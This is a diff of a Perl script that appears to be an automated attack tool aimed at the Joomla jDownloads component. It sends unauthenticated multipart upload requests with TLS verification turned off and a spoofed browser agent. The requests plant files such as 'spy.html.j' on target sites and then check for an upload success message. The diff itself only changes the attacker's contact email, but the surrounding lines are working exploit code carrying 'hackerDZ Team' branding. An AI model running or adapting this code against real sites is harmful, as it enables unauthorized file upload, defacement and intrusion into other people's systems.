@@ -1592,7 +1592,7 @@ my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
 $ua->timeout(10);
 $ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
 
-my $exploit = $ua->post("$jdup", Cookie => "", Content_Type => "form-data", Content => [ name=>"sohaip-hackerDZ", mail=>"moetazbusiness@gmail.com", filetitle =>"sohaip-hackerDZ Team", catlist=>"1", license=>"0", language=>"0", system=>"0",file_upload=>["$file"], pic_upload=>["$filez"], description=>"<p>zot</p>", senden=>"Send file", option=>"com_jdownloads", view=>"upload", send=>"1", "24c22896d6fe6977b731543b3e44c22f"=>"1"]);
+my $exploit = $ua->post("$jdup", Cookie => "", Content_Type => "form-data", Content => [ name=>"sohaip-hackerDZ", mail=>"suckhack24@gmail.com", filetitle =>"sohaip-hackerDZ Team", catlist=>"1", license=>"0", language=>"0", system=>"0",file_upload=>["$file"], pic_upload=>["$filez"], description=>"<p>zot</p>", senden=>"Send file", option=>"com_jdownloads", view=>"upload", send=>"1", "24c22896d6fe6977b731543b3e44c22f"=>"1"]);
 
 if ($exploit->decoded_content =~ /The file was successfully transferred to the server/) {
 
@@ -1618,7 +1618,7 @@ print"[comjdowloads Index ] ................ ";
 $def = $site . '/images/jdownloads/screenshots/spy.html.j';
 $filee="tools/spy.rar";
 $filezz="tools/spy.html.j";
-my $exploitx = $ua->post("$jdup", Cookie => "", Content_Type => "form-data", Content => [ name=>"sohaip-hackerDZ", mail=>"moetazbusiness@gmail.com", filetitle =>"sohaip-hackerDZ Team", catlist=>"1", license=>"0", language=>"0", system=>"0",file_upload=>["$filee"], pic_upload=>["$filezz"], description=>"<p>zot</p>", senden=>"Send file", option=>"com_jdownloads", view=>"upload", send=>"1", "24c22896d6fe6977b731543b3e44c22f"=>"1"]);
+my $exploitx = $ua->post("$jdup", Cookie => "", Content_Type => "form-data", Content => [ name=>"sohaip-hackerDZ", mail=>"suckhack24@gmail.com", filetitle =>"sohaip-hackerDZ Team", catlist=>"1", license=>"0", language=>"0", system=>"0",file_upload=>["$filee"], pic_upload=>["$filezz"], description=>"<p>zot</p>", senden=>"Send file", option=>"com_jdownloads", view=>"upload", send=>"1", "24c22896d6fe6977b731543b3e44c22f"=>"1"]);
 if ($exploit->decoded_content =~ /The file was successfully transferred to the server/) {
 
 
